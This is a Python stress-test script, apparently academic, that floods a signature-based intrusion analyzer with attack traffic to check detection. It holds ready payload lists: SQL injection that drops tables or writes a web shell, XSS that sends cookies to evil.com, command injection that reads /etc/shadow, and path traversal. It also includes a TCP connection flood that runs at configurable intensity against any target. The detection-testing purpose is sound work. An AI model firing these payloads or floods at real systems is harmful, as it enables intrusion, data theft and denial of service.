#!/usr/bin/env python3
"""
Интенсивный стресс-тест для сигнатурного анализатора
Автор: Якосбон Б.Ю.
МИФИ, Кафедра Криптологии и кибербезопасности, 2025

Возможности:
- Длительное тестирование (минуты/часы)
- Настраиваемая интенсивность
- Смешанные атаки (SQLi, XSS, DoS)
- Статистика в реальном времени
- Отчёт по завершению
"""

import argparse
import socket
import random
import time
import threading
import sys
import json
from datetime import datetime, timedelta
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse

# ============================================================================
# PAYLOADS - Расширенная база атак
# ============================================================================

SQLI_PAYLOADS = [
    # UNION-based
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION ALL SELECT username,password FROM users--",
    "1' UNION SELECT NULL,table_name FROM information_schema.tables--",
    "' UNION SELECT @@version,NULL,NULL--",
    "') UNION SELECT 1,CONCAT(user,':',password),3 FROM mysql.user--",
    
    # Time-based
    "1' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND BENCHMARK(10000000,SHA1('test'))--",
    "' OR IF(1=1,SLEEP(3),0)--",
    "1'; SELECT pg_sleep(5)--",
    
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXP(~(SELECT * FROM (SELECT user())a))--",
    
    # Boolean-based
    "' OR '1'='1",
    "' OR ''='",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' OR 'x'='x",
    "admin'--",
    "1' OR 'a'='a'/*",
    
    # Stacked queries
    "'; DROP TABLE users;--",
    "'; INSERT INTO users VALUES('hacker','pwned');--",
    "'; UPDATE users SET password='hacked' WHERE user='admin';--",
    
    # System access
    "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--",
    "' INTO OUTFILE '/var/www/shell.php'--",
    "1; SELECT * FROM sys.databases--",
    "'; EXEC xp_cmdshell('whoami');--",
]

XSS_PAYLOADS = [
    # Script tags
    "<script>alert('XSS')</script>",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<script src='http://evil.com/malicious.js'></script>",
    "<script>new Image().src='http://evil.com/steal?c='+document.cookie;</script>",
    
    # Event handlers
    "<img src=x onerror='alert(1)'>",
    "<body onload='alert(document.domain)'>",
    "<svg onload='alert(1)'>",
    "<input onfocus='alert(1)' autofocus>",
    "<marquee onstart='alert(1)'>",
    "<video><source onerror='alert(1)'>",
    "<details open ontoggle='alert(1)'>",
    
    # JavaScript protocol
    "<a href='javascript:alert(1)'>click</a>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<form action='javascript:alert(1)'><input type=submit>",
    "<object data='javascript:alert(1)'>",
    
    # Encoded variants
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
    
    # DOM-based
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>document.body.innerHTML='<h1>Hacked</h1>'</script>",
    "<script>window.location='http://evil.com/'+document.cookie</script>",
    
    # Filter bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script/src='http://evil.com/x.js'>",
    "<script\x09>alert(1)</script>",
    "<<script>alert(1)//<</script>",
]

CMD_INJECTION_PAYLOADS = [
    # Basic
    "; cat /etc/passwd",
    "| whoami",
    "& id",
    "|| ls -la",
    "`cat /etc/shadow`",
    "$(whoami)",
    
    # Chained
    "; cat /etc/passwd; id; whoami",
    "| cat /etc/passwd | grep root",
    
    # Encoded
    ";%20cat%20/etc/passwd",
    "%7Cwhoami",
    
    # Windows
    "& dir",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "& net user",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00.jpg",
    "....\\....\\....\\windows\\system32\\config\\sam",
]

NORMAL_REQUESTS = [
    "GET / HTTP/1.1",
    "GET /index.html HTTP/1.1",
    "GET /api/users HTTP/1.1",
    "POST /login HTTP/1.1",
    "GET /products?id=123 HTTP/1.1",
    "GET /search?q=hello+world HTTP/1.1",
    "POST /api/data HTTP/1.1",
    "GET /static/style.css HTTP/1.1",
    "GET /images/logo.png HTTP/1.1",
    "GET /about HTTP/1.1",
]


# ============================================================================
# HTTP Request Builder
# ============================================================================

def build_http_request(method: str, path: str, payload: str = "", host: str = "target.local") -> bytes:
    """Формирует HTTP запрос с payload"""
    
    if method == "GET":
        if "?" in path:
            full_path = f"{path}&q={urllib.parse.quote(payload)}"
        else:
            full_path = f"{path}?q={urllib.parse.quote(payload)}"
        
        request = f"{method} {full_path} HTTP/1.1\r\n"
        request += f"Host: {host}\r\n"
        request += "User-Agent: StressTest/1.0\r\n"
        request += "Accept: */*\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
    else:
        body = f"data={urllib.parse.quote(payload)}"
        request = f"{method} {path} HTTP/1.1\r\n"
        request += f"Host: {host}\r\n"
        request += "User-Agent: StressTest/1.0\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += f"Content-Length: {len(body)}\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
        request += body
    
    return request.encode()


# ============================================================================
# Attack Generators
# ============================================================================

class AttackGenerator:
    """Генератор атак для стресс-теста"""
    
    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
        
    def send_request(self, data: bytes, timeout: float = 2.0) -> bool:
        """Отправка запроса"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((self.target_host, self.target_port))
            sock.send(data)
            try:
                sock.recv(1024)
            except:
                pass
            sock.close()
            return True
        except Exception as e:
            return False
    
    def send_attack(self, attack_type: str, payload: str) -> bool:
        """Отправка атаки определённого типа"""
        
        paths = ["/", "/search", "/api/query", "/login", "/admin"]
        methods = ["GET", "POST"]
        
        path = random.choice(paths)
        method = random.choice(methods)
        
        request = build_http_request(method, path, payload)
        success = self.send_request(request)
        
        with self.lock:
            self.stats[f"{attack_type}_sent"] += 1
            if success:
                self.stats[f"{attack_type}_success"] += 1
        
        return success
    
    def send_syn_flood(self, count: int = 50) -> int:
        """SYN флуд"""
        successful = 0
        for _ in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.setblocking(False)
                try:
                    sock.connect((self.target_host, self.target_port))
                except:
                    pass
                sock.close()
                successful += 1
            except:
                pass
        
        with self.lock:
            self.stats["syn_sent"] += count
            self.stats["syn_success"] += successful
        
        return successful
    
    def run_sqli_batch(self, count: int) -> int:
        """Пакет SQL injection атак"""
        success = 0
        for _ in range(count):
            payload = random.choice(SQLI_PAYLOADS)
            if self.send_attack("sqli", payload):
                success += 1
            time.sleep(random.uniform(0.01, 0.05))
        return success
    
    def run_xss_batch(self, count: int) -> int:
        """Пакет XSS атак"""
        success = 0
        for _ in range(count):
            payload = random.choice(XSS_PAYLOADS)
            if self.send_attack("xss", payload):
                success += 1
            time.sleep(random.uniform(0.01, 0.05))
        return success
    
    def run_cmd_batch(self, count: int) -> int:
        """Пакет Command Injection атак"""
        success = 0
        for _ in range(count):
            payload = random.choice(CMD_INJECTION_PAYLOADS)
            if self.send_attack("cmd", payload):
                success += 1
            time.sleep(random.uniform(0.01, 0.05))
        return success
    
    def run_normal_batch(self, count: int) -> int:
        """Пакет нормального трафика"""
        success = 0
        for _ in range(count):
            request = random.choice(NORMAL_REQUESTS)
            data = f"{request}\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n".encode()
            if self.send_request(data):
                success += 1
            time.sleep(random.uniform(0.01, 0.05))
        return success


# ============================================================================
# Stress Test Runner
# ============================================================================

class StressTestRunner:
    """Управление стресс-тестом"""
    
    def __init__(self, target_host: str, target_port: int, duration: int, intensity: str):
        self.generator = AttackGenerator(target_host, target_port)
        self.duration = duration
        self.intensity = intensity
        self.running = True
        self.start_time = None
        
        # Настройки интенсивности
        self.intensity_config = {
            "low": {
                "sqli_per_sec": 2,
                "xss_per_sec": 2,
                "cmd_per_sec": 1,
                "syn_burst": 10,
                "normal_per_sec": 5,
                "workers": 2
            },
            "medium": {
                "sqli_per_sec": 10,
                "xss_per_sec": 10,
                "cmd_per_sec": 5,
                "syn_burst": 50,
                "normal_per_sec": 20,
                "workers": 4
            },
            "high": {
                "sqli_per_sec": 30,
                "xss_per_sec": 30,
                "cmd_per_sec": 15,
                "syn_burst": 200,
                "normal_per_sec": 50,
                "workers": 8
            },
            "extreme": {
                "sqli_per_sec": 100,
                "xss_per_sec": 100,
                "cmd_per_sec": 50,
                "syn_burst": 500,
                "normal_per_sec": 100,
                "workers": 16
            }
        }
        
        self.config = self.intensity_config.get(intensity, self.intensity_config["medium"])
    
    def print_status(self):
        """Вывод текущего статуса"""
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        
        stats = self.generator.stats
        
        print(f"\r[{elapsed:6.1f}s/{self.duration}s] "
              f"SQLi:{stats['sqli_sent']:5d} "
              f"XSS:{stats['xss_sent']:5d} "
              f"CMD:{stats['cmd_sent']:5d} "
              f"SYN:{stats['syn_sent']:5d} "
              f"Normal:{stats['normal_sent']:5d} "
              f"| Осталось: {remaining:.0f}s", end="", flush=True)
    
    def status_thread(self):
        """Поток обновления статуса"""
        while self.running:
            self.print_status()
            time.sleep(1)
    
    def attack_thread(self, attack_type: str):
        """Поток атак определённого типа"""
        while self.running:
            if attack_type == "sqli":
                self.generator.run_sqli_batch(self.config["sqli_per_sec"])
            elif attack_type == "xss":
                self.generator.run_xss_batch(self.config["xss_per_sec"])
            elif attack_type == "cmd":
                self.generator.run_cmd_batch(self.config["cmd_per_sec"])
            elif attack_type == "normal":
                self.generator.run_normal_batch(self.config["normal_per_sec"])
            elif attack_type == "syn":
                self.generator.send_syn_flood(self.config["syn_burst"])
                time.sleep(5)  # SYN burst каждые 5 секунд
            
            time.sleep(1)
    
    def run(self):
        """Запуск стресс-теста"""
        print("=" * 70)
        print("СТРЕСС-ТЕСТ СИГНАТУРНОГО АНАЛИЗАТОРА")
        print("=" * 70)
        print(f"Цель: {self.generator.target_host}:{self.generator.target_port}")
        print(f"Длительность: {self.duration} секунд")
        print(f"Интенсивность: {self.intensity}")
        print(f"Воркеры: {self.config['workers']}")
        print("=" * 70)
        print("\nЗапуск теста...\n")
        
        self.start_time = time.time()
        
        threads = []
        
        # Поток статуса
        status_t = threading.Thread(target=self.status_thread)
        status_t.start()
        threads.append(status_t)
        
        # Потоки атак
        attack_types = ["sqli", "xss", "cmd", "normal", "syn"]
        for attack_type in attack_types:
            t = threading.Thread(target=self.attack_thread, args=(attack_type,))
            t.start()
            threads.append(t)
        
        # Ожидание завершения
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print("\n\nПрерывание по Ctrl+C...")
        
        self.running = False
        
        # Ждём завершения потоков
        for t in threads:
            t.join(timeout=2)
        
        print("\n\n")
        self.print_report()
    
    def print_report(self):
        """Финальный отчёт"""
        stats = self.generator.stats
        elapsed = time.time() - self.start_time
        
        print("=" * 70)
        print("ОТЧЁТ О СТРЕСС-ТЕСТЕ")
        print("=" * 70)
        print(f"Время тестирования: {elapsed:.1f} секунд")
        print(f"Интенсивность: {self.intensity}")
        print()
        print("Отправлено атак:")
        print(f"  SQL Injection:       {stats['sqli_sent']:8d}  (успешно: {stats['sqli_success']})")
        print(f"  XSS:                 {stats['xss_sent']:8d}  (успешно: {stats['xss_success']})")
        print(f"  Command Injection:   {stats['cmd_sent']:8d}  (успешно: {stats['cmd_success']})")
        print(f"  SYN Flood:           {stats['syn_sent']:8d}  (успешно: {stats['syn_success']})")
        print(f"  Нормальный трафик:   {stats['normal_sent']:8d}  (успешно: {stats['normal_success']})")
        print()
        
        total_attacks = stats['sqli_sent'] + stats['xss_sent'] + stats['cmd_sent'] + stats['syn_sent']
        total_all = total_attacks + stats['normal_sent']
        
        print(f"Всего атак:            {total_attacks:8d}")
        print(f"Всего пакетов:         {total_all:8d}")
        print(f"Пакетов в секунду:     {total_all/elapsed:8.1f}")
        print()
        print("=" * 70)
        print("Проверьте логи анализатора для оценки детектирования!")
        print("=" * 70)
        
        # Сохранение отчёта
        report = {
            "timestamp": datetime.now().isoformat(),
            "duration_sec": elapsed,
            "intensity": self.intensity,
            "target": f"{self.generator.target_host}:{self.generator.target_port}",
            "stats": dict(stats),
            "total_attacks": total_attacks,
            "total_packets": total_all,
            "packets_per_second": total_all / elapsed
        }
        
        report_file = f"stress_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\nОтчёт сохранён: {report_file}")


# ============================================================================
# Simple Test Server (для тестирования без анализатора)
# ============================================================================

def run_test_server(port: int):
    """Простой HTTP сервер для приёма тестовых запросов"""
    import http.server
    import socketserver
    
    class QuietHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            pass  # Тихий режим
        
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        
        def do_POST(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
    
    with socketserver.TCPServer(("", port), QuietHandler) as httpd:
        print(f"Тестовый сервер запущен на порту {port}")
        print("Ctrl+C для остановки")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nСервер остановлен")


# ============================================================================
# Main
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Стресс-тест сигнатурного анализатора",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  # Тест на 60 секунд со средней интенсивностью
  python3 stress_test.py -t 192.168.100.1 -p 8080 -d 60 -i medium
  
  # Интенсивный тест на 5 минут
  python3 stress_test.py -t 192.168.100.1 -p 8080 -d 300 -i high
  
  # Экстремальный тест на 10 минут
  python3 stress_test.py -t 192.168.100.1 -p 8080 -d 600 -i extreme
  
  # Запуск тестового сервера
  python3 stress_test.py --server -p 8080
        """
    )
    
    parser.add_argument("-t", "--target", default="127.0.0.1", help="IP цели")
    parser.add_argument("-p", "--port", type=int, default=8080, help="Порт цели")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Длительность в секундах")
    parser.add_argument("-i", "--intensity", choices=["low", "medium", "high", "extreme"],
                        default="medium", help="Интенсивность теста")
    parser.add_argument("--server", action="store_true", help="Запустить тестовый сервер")
    
    args = parser.parse_args()
    
    if args.server:
        run_test_server(args.port)
    else:
        runner = StressTestRunner(args.target, args.port, args.duration, args.intensity)
        runner.run()


if __name__ == "__main__":
    main()
